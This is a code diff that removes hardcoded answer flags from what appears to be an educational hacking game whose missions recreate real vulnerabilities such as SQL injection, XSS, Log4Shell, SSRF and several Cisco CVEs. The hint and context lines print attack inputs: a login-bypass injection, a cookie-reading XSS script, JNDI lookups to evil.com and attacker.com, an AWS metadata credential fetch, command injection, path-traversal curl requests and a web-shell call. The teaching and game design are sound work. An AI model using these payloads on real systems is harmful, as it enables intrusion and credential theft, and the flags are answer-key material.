@@ -149,7 +149,6 @@ sha256sum received_scroll.txt
         "Return to the King's Chamber and unlock the vault: cd chambers/kings  then  unlock-vault",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{CIA_TR14D_P1LL4RS}",
       fragments: [
         { trigger: "/chambers/kings/inscription.txt", value: "FLAG{CIA_", label: "King's Chamber — Confidentiality" },
         { trigger: "/chambers/queens/inscription.txt", value: "TR14D_", label: "Queen's Chamber — Integrity" },
@@ -337,7 +336,6 @@ sha256sum received_scroll.txt
         "You found a hidden scroll. Read it with: cat sanctum/.hidden",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{R0GU3_M0D3L_F0UND}",
       fragments: [
         { trigger: "/logs/prophecy.log", value: "FLAG{R0GU3_", label: "Prophecy Log — Unusual Routing Detected" },
         { trigger: "/logs/oracle.log", value: "M0D3L_", label: "Oracle Log — Anomalous Output Confirmed" },
@@ -503,7 +501,6 @@ $stmt->execute([$username, $password]);`,
         "SQL comments (--) make the database skip the password check. Try: login admin'-- anything",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{SQL_1NJ3CT10N_BYPASS3D}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{SQL_", label: "Mission Brief — Archive Target Identified" },
         { trigger: "/source/login.php", value: "1NJ3CT10N_", label: "Vulnerable Source — Unsanitized Query Found" },
@@ -681,7 +678,6 @@ $stmt->execute([$username, $password]);`,
         "Test the XSS payload. Run: reflect <script>alert(document.cookie)</script>",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{XSS_S4MY_W4S_H3R3_2005}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{XSS_", label: "Mission Brief — Agora Board Target" },
         { trigger: "/source/inscriptions.js", value: "S4MY_W4S_", label: "Vulnerable Source — innerHTML Without Sanitization" },
@@ -849,7 +845,6 @@ if (payload > s) return 0; /* bounds check */`,
         "The flaw: the keeper trusts your claimed length. Claim far more than you send. Run: heartbeat HI 10000",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{H3RTBL33D_M3M0RY_L34K3D}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{H3RTBL33D_", label: "Mission Brief — Pharos TLS Target" },
         { trigger: "/pharos_info.txt", value: "M3M0RY_", label: "Pharos Info — Vulnerable OpenSSL 1.0.1f" },
@@ -1022,7 +1017,6 @@ app.get('/api/vessel/:id', async (req, res) => {
         "Vessel IDs are sequential integers starting at 1. Request vessel 1 (Admiral's galley). Run: api GET /api/vessel/1",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{1D0R_ACC3SS_C0NTR0L_BR0K3N}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{1D0R_", label: "Mission Brief — Harbor Registry Target" },
         { trigger: "api GET /api/vessel/me", value: "ACC3SS_", label: "Your Vessel — Legitimate Access Confirmed" },
@@ -1178,7 +1172,6 @@ hash = bcrypt.hash("password123", rounds=12)
         "Once you crack it, log in: login admin letmein",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{W34K_H4SH_CR4CK3D}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{W34K_", label: "Mission Brief — Seal Registry Target" },
         { trigger: "/admin_hash.txt", value: "H4SH_", label: "Admin Hash — SHA-1 Unsalted" },
@@ -1356,7 +1349,6 @@ username: \${j\${::-n}di:ldap://evil.com/a}
         "JNDI is a Java API for network invocations. Embed a JNDI payload. Try: log ${jndi:ldap://attacker.com/a}",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{L0G4SH3LL_JNDI_RCE_2021}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{L0G4SH3LL_", label: "Mission Brief — Temple Log4j Target" },
         { trigger: "/dependencies.txt", value: "JNDI_", label: "Dependencies — Vulnerable Log4j 2.14.1" },
@@ -1520,7 +1512,6 @@ while (true) {
         "Analyze the stone-path traffic on route 445 to find the plague signature. Run: analyze port 445",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{W4NN4CRY_", label: "Incident Report — Druidic Network Attack" },
         { trigger: "/capture/traffic.txt", value: "SMB_", label: "Traffic Capture — SMBv1 Exploit Detected" },
@@ -1696,7 +1687,6 @@ POST /api/preview
         "Get the actual credentials. Run: fetch http://169.254.169.254/latest/meta-data/security-credentials/",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{SSRF_", label: "Mission Brief — Herald Fetch Service" },
         { trigger: "fetch http://169.254.169.254/latest/meta-data/iam/", value: "AWS_M3T4D4T4_", label: "IAM Role — Praetorian Credentials Located" },
@@ -1849,7 +1839,6 @@ Content-Type: %{
         "Use %{} with OGNL to execute code. Try: send-request %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hack','yes')}",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{3QU1F4X_STR2_RCE_2017}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{3QU1F4X_", label: "Mission Brief — Struts Archive Target" },
         { trigger: "/archive_info.txt", value: "STR2_", label: "Archive Info — CVE-2017-5638 Unpatched" },
@@ -2022,7 +2011,6 @@ mongod --bind_ip 127.0.0.1 --auth`,
         "Query the treasury. Run: mongo find citizens",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}",
       fragments: [
         { trigger: "/README.txt", value: "FLAG{M0NG0DB_", label: "Mission Brief — Temple Treasury Target" },
         { trigger: "/etc/.env", value: "N0_4UTH_", label: "Hidden Config — No Authentication Configured" },
@@ -2208,7 +2196,6 @@ curl -u hacker:hacked123 https://target-iosxe/webui/
         "Pull the classified network records. Run: extract-intel",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{CV3_2023_20198_N0_AUTH_RCE}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{CV3_2023_", label: "Mission Brief — IOS XE Zero-Day Campaign" },
         { trigger: "forge-credentials agent p4ssw0rd", value: "20198_N0_", label: "Account Created — No Auth Required" },
@@ -2368,7 +2355,6 @@ python extrabacon.py exploit -t target-asa \\
         "Access the system after the overflow disables authentication. Run: access-system",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{3XTRB4C0N_SNMP_0WN3D}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{3XTRB4C0N_", label: "Mission Brief — EXTRABACON NSA Weapon" },
         { trigger: "overflow-handler public", value: "SNMP_", label: "Buffer Overflow — SNMP Handler Corrupted" },
@@ -2530,7 +2516,6 @@ python siet.py -i 192.168.1.1 -e shell.bin
         "Read the configuration file. Run: cat config.dat",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{SM4RT_1NST4LL_N0_AUTH}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{SM4RT_", label: "Mission Brief — Smart Install Supply Gate" },
         { trigger: "connect-port 4786", value: "1NST4LL_", label: "Port 4786 — Provisioning Service Reached" },
@@ -2698,7 +2683,6 @@ curl -k 'https://target-rv320/cgi-bin/export_debug_msg.exp' \\
         "The config endpoint requires no credentials. Run: probe-target /config/export",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{RV320_C0NF1G_DUMP3D}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{RV320_", label: "Mission Brief — Notre-Dame Scriptorium" },
         { trigger: "probe-target /", value: "C0NF1G_", label: "Attack Surface Mapped — Config Endpoint Found" },
@@ -2840,7 +2824,6 @@ curl -k 'https://target-asa/+CSCOE+/files/../../+CSCOU+/../running-config'
         "Pull the device configuration. Run: request-file /files/../../config/running-config.txt",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{P4TH_TR4V3RS4L_ASA_OWN3D}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{P4TH_", label: "Mission Brief — Great Wall Path Traversal" },
         { trigger: "request-file /files/../../config/", value: "TR4V3RS4L_", label: "Above Web Root — Config Directory Reached" },
@@ -2988,7 +2971,6 @@ curl -X POST https://wlc-management/login \\
         "Pull the access configuration. Run: pull-access-config",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{WLC_4UTH_BYPA55_CVE_2022}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{WLC_", label: "Mission Brief — Alhambra WLC Target" },
         { trigger: "attempt-login Cisco anypass", value: "4UTH_BYPA55_", label: "Auth Bypassed — Magic Username Accepted" },
@@ -3135,7 +3117,6 @@ curl -X POST https://hx-node/hxinstall/install \\
         "Read the classified file. Run: send-payload http://repo.local/pkg.tar;cat /ops/classified.txt",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{HYP3RFL3X_CMD_1NJ3CT10N}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{HYP3RFL3X_", label: "Mission Brief — Krak des Chevaliers HyperFlex" },
         { trigger: "send-payload http://repo.local/pkg.tar;whoami", value: "CMD_", label: "Command Injected — Root Confirmed" },
@@ -3283,7 +3264,6 @@ curl https://target/webui/menu.json \\
         "Verify the implant is live. Run: query-implant whoami",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{BADC4NDY_R00T_IMPL4NT}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{BADC4NDY_", label: "Mission Brief — Machu Picchu IOS XE Chain" },
         { trigger: "deploy-implant", value: "R00T_", label: "Implant Deployed — Persistent Root Access" },
@@ -3449,7 +3429,6 @@ curl -k "https://prime-infra/shell.jsp?cmd=id"
         "Pull the classified records. Run: execute-payload cat /ops/classified.txt",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{PR1M3_1NFR4_RCE_UPL04D}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{PR1M3_", label: "Mission Brief — Chichen Itza Prime Infrastructure" },
         { trigger: "upload-payload agent.jsp", value: "1NFR4_", label: "Payload Uploaded — JSP Shell Placed" },
@@ -3605,7 +3584,6 @@ fetch('/api/v1/users', {method:'POST',
         "Deliver the payload URL to the admin. Run: deliver-to-admin <script>steal-session</script>",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{ASA_XSS_S3SS10N_H1JACK}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{ASA_", label: "Mission Brief — Mont-Saint-Michel ASA XSS" },
         { trigger: "craft-payload <script>steal-session</script>", value: "XSS_S3SS10N_", label: "Payload Confirmed — Script Executes in Admin Context" },
@@ -3768,7 +3746,6 @@ curl -k -X DELETE \\
         "Delete the config to complete the mission. Run: wipe-file /files/../../vpn/config.dat",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{3D1NBR0_F1L3_D3L3T3D}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{3D1NBR0_", label: "Mission Brief — Edinburgh Castle File Deletion" },
         { trigger: "read-file /files/../../vpn/config.dat", value: "F1L3_", label: "VPN Config Read — Credentials Exfiltrated" },
@@ -3929,7 +3906,6 @@ sendp(pkt, iface="eth0")
         "Execute a command on the compromised device. Run: execute-command show-classified",
         "Run 'assemble' to see collected fragments, then submit the flag",
       ],
-      flag: "FLAG{10S_DHCP_BUFF3R_0V3RFL0W}",
       fragments: [
         { trigger: "/briefing.txt", value: "FLAG{10S_", label: "Mission Brief — Topkapi IOS DHCP Target" },
         { trigger: "send-packet exploit 500", value: "DHCP_", label: "Buffer Overflow — Option 82 Handler Corrupted" },
